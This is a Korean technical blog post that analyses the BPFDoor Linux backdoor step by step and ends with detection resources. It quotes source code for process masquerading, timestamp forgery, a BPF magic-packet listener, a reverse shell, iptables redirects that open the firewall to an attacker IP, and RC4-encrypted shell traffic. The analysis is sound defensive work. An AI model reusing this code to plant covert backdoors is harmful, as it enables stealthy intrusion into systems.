[BPFDoor](https://www.pwc.com/gx/en/issues/cybersecurity/cyber-threat-intelligence/cyber-year-in-retrospect/yir-cyber-threats-report-download.pdf)는 Berkeley Packet Filter (BPF)를 활용한 백도어 악성코드로서 2021년 PWC 사의 위협 보고서를 통해 최초로 공개되었다. BPF의 필터링 기능을 악용하여, 방화벽을 우회하고 패킷 기반 명령 수신이 가능하도록 구성된 백도어이다.

## 동작 방식

Github에 공개된 [BPFDoor 코드 중 하나](https://github.com/gwillgues/BPFDoor/blob/main/bpfdoor.c) 의 동작 과정을 상세히 살펴보자.

### 1. 프로세스 실행 경로 위조

```c
if (argc == 1) {
    if (to_open(argv[0], "kdmtmpflush") == 0)
        _exit(0);
    _exit(-1);
}
```

- (기본값으로) 프로세스 실행 파일 경로 추적을 방지하기 위해 자기 자신을 `/dev/shm/kdmtmpflush` 경로로 복제하고 실행한다.

- 내부적으로는 아래같은 명령어가 실행된다.

  ```
    /bin/rm -f /dev/shm/kdmtmpflush
    /bin/cp <현재 실행 바이너리> /dev/shm/kdmtmpflush
    /bin/chmod 755 /dev/shm/kdmtmpflush
    /dev/shm/kdmtmpflush --init
  ```

### 2. 환경 설정 및 패스워드 초기화

- 내부 struct config 구조체에 RC4 통신 키, 매직 패킷 인증로 사용할 두 개의 패스워드를 저장한다.

```c
strcpy(cfg.pass, hash);
strcpy(cfg.pass2, hash2);
```

### 3. 시간 위조 및 설치 흔적 제거

```c
setup_time(argv[0]);
```

- 실행 파일의 타임스탬프를 조작하여 변경 시점을 2008년의 과거로 위조한다.

### 4. 환경 위장 및 프로세스 이름 변경

- `set_proc_name()` 함수로 환경변수와 명령행 인자를 모두 덮어쓰고, `prctl(PR_SET_NAME)` 시스템 콜을 사용하여 프로세스 이름을 실제 시스템 데몬 이름처럼 바꾼다.
- e.g. `/sbin/udevd -d`, `dbus-daemon --system` ...

```c

int set_proc_name(int argc, char **argv, char *new) {
        size_t size = 0;
        int i;
        char *raw = NULL;
        char *last = NULL;
 
        argv0 = argv[0];
 
        for (i = 0; environ[i]; i++)
                size += strlen(environ[i]) + 1;
 
        raw = (char *) malloc(size);
        if (NULL == raw)
                return -1;
 
        for (i = 0; environ[i]; i++)
        {
                memcpy(raw, environ[i], strlen(environ[i]) + 1);
                environ[i] = raw;
                raw += strlen(environ[i]) + 1;
        }
 
        last = argv[0];
 
        for (i = 0; i < argc; i++)
                last += strlen(argv[i]) + 1;
        for (i = 0; environ[i]; i++)
                last += strlen(environ[i]) + 1;
 
        memset(argv0, 0x00, last - argv0);
        strncpy(argv0, new, last - argv0);
 
        prctl(PR_SET_NAME, (unsigned long) new);
        return 0;
}

// ...

set_proc_name(argc, argv, cfg.mask);
```

### 5. BPF 기반 패킷 스니핑

- 로우 소켓을 통해 NIC를 직접 제어하여 IP 패킷을 캡처한다. 이 때 BPF 필터 (struct sock_fprog)를 사용해 특정 조건 (프로토콜, 포트, 패턴 등)을 만족하는 패킷만을 처리한다.
- BPF가 아닌 다른 방식으로 패킷을 수신하려면 raw socket을 항상 열어두고 있어야 하고, 이는 `/proc/net/raw` 등에 노출되어 탐지되기 쉽다. 여기서 BPF는 시작 신호를 탐지하기 위해서만 사용되고 이후 암호화된 TTY 쉘을 직접 열어 공격 행위를 수행하기 위한 별도 동작을 수행한다.

```c
// Filter Options Build Filter Struct
struct sock_fprog filter;
struct sock_filter bpf_code[] = {
        { 0x28, 0, 0, 0x0000000c },
        { 0x15, 0, 27, 0x00000800 },
        { 0x30, 0, 0, 0x00000017 },
        // ...
};

filter.len = sizeof(bpf_code)/sizeof(bpf_code[0]);
filter.filter = bpf_code;

// Build a rawsocket that binds the NIC to receive Ethernet frames
if ((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP))) < 1)
        return;

// Set a packet filter
if (setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &filter, sizeof(filter)) == -1) {
        return;
}

// Loop to Read Packets in 512 Chunks
while (1) {
        memset(buff, 0, 512);
        psize = 0;
        r_len = recvfrom(sock, buff, 512, 0x0, NULL, NULL);
        // ...
}
close(sock);
```

### 6. 매직 패킷 분석 및 명령 분기

> 매직패킷이란?:<br/>
> 매직 패킷이란 일반적으로 특정한 구조를 가진 네트워크 패킷을 의미하며, 이를 수신한 프로그램 또는 시스템은 미리 정의된 행동을 트리거하게 된다. 여기선 백도어 활성화 신호를 매직 패킷으로 보낸다.

- 위에서 설명한 반복문에서 패킷을 지속적으로 캡처하다가, 패킷이 (페이로드의 특정 위치에 `0x7255`나 `0x5293` 등의 flag 값이 존재하는) 매직 패킷으로 식별되면 패스워드를 비교하여 경우에 따라 다음 세 가지 행동을 수행한다:
  - `0`: 1번째 pass와 일치하는 경우, 연결 대상에 대한 역방향 쉘 연결(reverse shell)
  - `1`: 2번째 pass와 일치하는 경우,  iptables 명령어를 통해 로컬 포트를 리디렉션한 뒤 shell 제공
  - `2`: 둘 다 아닌 경우, UDP를 이용한 ping 메시지 응답

```c
int logon(const char *hash) {
        int x = 0;
        x = memcmp(cfg.pass, hash, strlen(cfg.pass));
        if (x == 0)
                return 0;
        x = memcmp(cfg.pass2, hash, strlen(cfg.pass2));
        if (x == 0)
                return 1;
 
        return 2;
}

cmp = logon(mp->pass);
switch(cmp) {
        case 1: // connect reverse shell 
                strcpy(sip, inet_ntoa(ip->ip_src));
                getshell(sip, ntohs(tcp->th_dport));
                break;
        case 0:  // getshell + iptables redirect
                scli = try_link(bip, mp->port);
                if (scli > 0)
                        shell(scli, NULL, NULL);
                break;
        case 2:  // UDP ping response
                mon(bip, mp->port);
                break;
}
```

### 7. RC4 기반 암복호화 통신

- BPFDoor는 통신 보안과 은폐를 위해 RC4 스트림 암호화를 사용한다. RC4는 키 스트림을 기반으로 입력 데이터를 XOR하여 암복호화를 수행한다.
• 매직 패킷의 pass 값을 RC4 키로 사용하여 송수신용 컨텍스트를 각각 초기화한다.

```c
rc4_init(mp->pass, strlen(mp->pass), &crypt_ctx);
rc4_init(mp->pass, strlen(mp->pass), &decrypt_ctx);
``````

• 이후 통신 과정에서 `cwrite()`와 `cread()` 함수가 각각 `write()`/`read()` 전에 RC4 처리를 수행한다.

- 송신 시에는 데이터를 RC4로 암호화한 후 전송, 수신 시에는 암호화된 데이터를 복호화하여 터미널에 출력한다.

```c
int cwrite(int fd, void *buf, int count) {
    uchar*tmp = malloc(count);
    memcpy(tmp, buf, count);
    rc4(tmp, count, &crypt_ctx);
    int ret = write(fd, tmp, count);
    free(tmp);
    return ret;
}

int cread(int fd, void *buf, int count) {
    int i = read(fd, buf, count);
    if (i > 0)
        rc4(buf, i, &decrypt_ctx);
    return i;
}

// 위 코드와 동일한 while문
while (1) {
    // ...
    FD_ZERO(&fds);
    FD_SET(pty, &fds);
    FD_SET(sock, &fds);
    if (select((pty > sock) ? (pty+1) : (sock+1),
            &fds, NULL, NULL, NULL) < 0)
    {
            break;
    }
    if (FD_ISSET(pty, &fds)) {
            int count;
            count = read(pty, buf, BUF);
            if (count <= 0) break;
            if (cwrite(sock, buf, count) <= 0) break;
    }
    if (FD_ISSET(sock, &fds)) {
            int count;
            unsigned char *p, *d;
            d = (unsigned char *)buf;
            count = cread(sock, buf, BUF);
            if (count <= 0) break;
            // ...
    }
}
```

### 8. 의사 터미널(PTY) 생성 및 쉘 실행

- 대화형 TTY 쉘을 만들기 위해 의사 터미널을 생성한다.

```c
// PTY/TTY 쌍 생성
char pts_name[20];
pty = ptym_open(pts_name); // /dev/ptmx 오픈
tty = ptys_open(pty, pts_name); // 대응하는 /dev/pts/X 오픈
```

- `ptym_open()`은 `/dev/ptmx`를 열어 마스터 PTY를 반환하고 대응하는 슬레이브 TTY 경로(`/dev/pts/N`)를 가져온다.
- `ptys_open()`은 슬레이브 TTY를 열고 IOCTL로 추가 설정을 적용한다.

```c
// 쉘 실행
dup2(tty, 0); dup2(tty, 1); dup2(tty, 2);
execve("/bin/sh", argvv, envp);
```

- 슬레이브 TTY를 stdin, stdout, stderr에 연결하고, `/bin/sh`를 `execve()`로 실행하여 대화형 쉘을 제공한다.

### 9. 대화형 쉘 I/O 리디렉션 및 제어

이후 `select()` 시스템 콜을 통해 PTY와 소켓의 입출력을 감시하며 데이터를 양방향 전송한다.

```c
while (1) {
    FD_ZERO(&fds);
    FD_SET(pty, &fds);
    FD_SET(sock, &fds);

    select(max(pty, sock) + 1, &fds, NULL, NULL, NULL);

    if (FD_ISSET(pty, &fds)) {
        int count = read(pty, buf, BUF);
        if (count <= 0) break;
        cwrite(sock, buf, count); // 암호화 후 전송
    }

    if (FD_ISSET(sock, &fds)) {
        int count = cread(sock, buf, BUF); // 수신 후 복호화
        if (count <= 0) break;
        write(pty, buf, count);
    }
}
```

쉘 연결시에, 역방향 연결이 불가능한 상황에서는 iptables 명령어를 사용하여 포트를 리디렉션함으로써 외부 접속을 유도한다.

- e.g. 외부에서 `192.168.0.100:12345`로 접속 시 내부에서는 `127.0.0.1:54321`로 전달되도록 설정

```c
snprintf(cmd, sizeof(cmd), "/sbin/iptables -t nat -A PREROUTING -p tcp -s %s --dport %d -j REDIRECT --to-ports %d", ip, fromport, toport);
system(cmd);
```

그리고 방화벽에서 공격자의 IP를 허용하도록 설정한다.

```c
snprintf(inputcmd, sizeof(inputcmd), "/sbin/iptables -I INPUT -p tcp -s %s -j ACCEPT", ip);
system(inputcmd);
```

세션 종료 시 위에서 추가한 룰을 제거하여 흔적을 지운다.

```
if (rcmd != NULL) system(rcmd); // -D PREROUTING
if (dcmd != NULL) system(dcmd); // -D INPUT
```

## 탐지 및 방어

공유 메모리 기반의 실행 및 흔적 은폐, 프로세스 이름 및 새성시간 조작, iptables를 활용한 포트 리디렉션 등의 은닉 방식을 사용하기 때문에 일반적인 파일 기반 백신이나 해시 탐지 도구로는 탐지가 어려우며, 시스템 행위 기반의 EDR 솔루션이나, 비정상 프로세스 명/포트 탐지 체계가 필수적이다.

[Elastic Security](https://www.trendmicro.com/en_us/research/25/d/bpfdoor-hidden-controller.html)
등 다양한 보안 업체에서 이를 감지, 대응하기 위해 만든 도구가 있다.
    - [BPFDoor scanner](https://www.elastic.co/security-labs/bpfdoor-scanner)
    - [BPFDoor configuration extractor](https://www.elastic.co/security-labs/bpfdoor-configuration-extractor)

---
참고

- <https://www.ahnlab.com/ko/contents/content-center/35827>
- <https://www.elastic.co/security-labs/a-peek-behind-the-bpfdoor>
- <https://www.trendmicro.com/en_us/research/25/d/bpfdoor-hidden-controller.html>
- <https://asec.ahnlab.com/ko/83742/>
